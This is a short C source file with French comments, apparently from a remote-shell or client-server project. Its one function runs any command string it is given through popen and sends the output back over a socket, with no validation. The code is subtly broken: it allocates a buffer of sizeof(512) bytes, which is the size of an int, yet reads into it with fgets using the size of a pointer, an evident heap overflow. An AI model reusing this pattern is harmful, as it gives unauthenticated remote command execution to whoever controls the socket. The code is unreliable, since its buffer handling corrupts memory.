#include "Commandes.h"



char* commandes_local(int socket, char* commande){
	printf("commande start");
	FILE* in;
	extern FILE* popen();
	char* buff = malloc(sizeof(512));


	// pipe sur l'invite de commande avec popen et execution de la commande passé en parametre
	if(!(in = popen(commande, "r"))){
		exit(1);
	}

	while(fgets(buff, sizeof(buff), in)!=NULL){
		printf("MY : : : :    %s", buff);
		send_to(socket, buff);
	}
	pclose(in);
	printf("end commande buff: %s\n", buff);
	return buff;
}